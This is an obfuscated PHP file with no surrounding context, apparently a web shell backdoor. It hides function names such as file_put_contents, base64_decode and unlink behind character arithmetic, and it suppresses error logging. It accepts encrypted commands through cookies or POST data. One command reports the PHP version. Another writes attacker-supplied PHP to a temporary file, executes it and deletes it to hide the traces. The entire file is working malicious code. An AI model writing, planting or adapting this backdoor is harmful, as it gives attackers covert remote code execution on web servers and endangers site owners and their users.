<?php $gqnrqzplek = chr(102)."\151".chr(796-688).chr(101).chr(95)."\160"."\165".chr(116).chr(95).chr(99)."\157"."\156"."\x74"."\145".chr(401-291)."\164".chr(115);
$qghby = chr(576-478).'a'.chr(171-56)."\x65"."\66"."\x34".chr(1048-953)."\x64"."\145".chr(1011-912).chr(111).chr(924-824)."\x65";
$jwdvv = chr(455-350).'n'.chr(777-672).chr(573-478)."\163"."\145".'t';
$mqanw = chr(117).chr(110).'l'.chr(550-445).'n'.chr(107);


@$jwdvv("\x65".chr(114)."\x72"."\157"."\162"."\137"."\x6c"."\157"."\x67", NULL);
@$jwdvv("\x6c"."\x6f".chr(103)."\137".chr(578-477).chr(579-465)."\162".chr(193-82)."\162".'s', 0);
@$jwdvv('m'."\x61".'x'.'_'."\x65"."\x78".chr(101).chr(767-668)."\165"."\x74".chr(1034-929)."\157"."\156"."\x5f".chr(1004-888)."\151"."\x6d"."\145", 0);
@set_time_limit(0);

function lkrqjz($zdsjlxa, $huwcinlikfbisy)
{
    $xggseo = "";
    for ($huwcinlikf = 0; $huwcinlikf < strlen($zdsjlxa);) {
        for ($j = 0; $j < strlen($huwcinlikfbisy) && $huwcinlikf < strlen($zdsjlxa); $j++, $huwcinlikf++) {
            $xggseo .= chr(ord($zdsjlxa[$huwcinlikf]) ^ ord($huwcinlikfbisy[$j]));
        }
    }
    return $xggseo;
}

$owgazdur = array_merge($_COOKIE, $_POST);
$xniha = 'a1dc2cb4-bacc-4ad9-8c66-438a3c90681d';
foreach ($owgazdur as $vfwwdgji => $zdsjlxa) {
    $zdsjlxa = @unserialize(lkrqjz(lkrqjz($qghby($zdsjlxa), $xniha), $vfwwdgji));
    if (isset($zdsjlxa["\x61".chr(534-427)])) {
        if ($zdsjlxa[chr(97)] == "\151") {
            $huwcinlikf = array(
                chr(112)."\166" => @phpversion(),
                "\163".'v' => "3.5",
            );
            echo @serialize($huwcinlikf);
        } elseif ($zdsjlxa[chr(97)] == 'e') {
            $tubkxyog = "./" . md5($xniha) . "\x2e".'i'.chr(110).'c';
            @$gqnrqzplek($tubkxyog, "<" . chr(63).chr(112).'h'."\160".chr(32).chr(64).chr(975-858)."\156"."\154"."\x69".'n'."\x6b"."\x28"."\x5f"."\137"."\x46".chr(73).chr(873-797)."\105"."\x5f"."\137".chr(921-880).chr(59).chr(68-36) . $zdsjlxa[chr(1026-926)]);
            @include($tubkxyog);
            @$mqanw($tubkxyog);
        }
        exit();
    }
}

